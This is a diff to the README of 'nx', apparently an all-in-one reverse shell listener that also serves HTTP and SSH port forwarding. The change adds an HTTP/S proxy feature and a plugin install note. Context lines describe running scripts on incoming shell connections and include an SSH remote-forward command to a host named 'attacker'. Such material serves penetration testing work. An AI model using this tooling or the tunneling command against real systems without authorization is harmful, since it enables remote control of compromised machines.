@@ -5,6 +5,7 @@
 All-in-One:
 - reverse shell
 - http server
+- http/s proxy
 - port-forwarding-only ssh server
 
 ## Prerequisites
@@ -61,7 +62,7 @@ Application Options:
 
 - **Plugin system**: Use `--exec <plugin>` to run custom scripts on connection
 - **Auto-upgrade to TTY**: Use `--exec auto` (or deprecated `--auto` flag) to automatically upgrade your shell to a TTY
-- **Protocol multiplexing**: Serve files over HTTP and SSH tunneling on the same port as shell connections
+- **Protocol multiplexing**: Serve files over HTTP, proxy network requests, and SSH tunneling on the same port as reverse shell connections
 - **SSH tunneling**: Support for local (-L) and remote (-R) port forwarding with optional password authentication
 - **XDG runtime paths**: Automatically uses XDG runtime directory for socket location
 - **Signal handling**: Properly handles signals and performs cleanup
@@ -96,6 +97,7 @@ whoami
 ### Built-in Plugins
 
 - **auto**: TTY upgrade script
+- install with `nx --install-plugins`
 
 ## Protocol Multiplexing
 
@@ -142,6 +144,7 @@ ssh -R 9090:localhost:22 -N user@attacker -p 8443
 ## How?
 
 unix domain sockets mannn
+
 
 ## ToDo
 - [x] ~~maybe a plugin system for sending commands on connection~~ ✅ **DONE**: Implemented plugin system with `--exec` flag
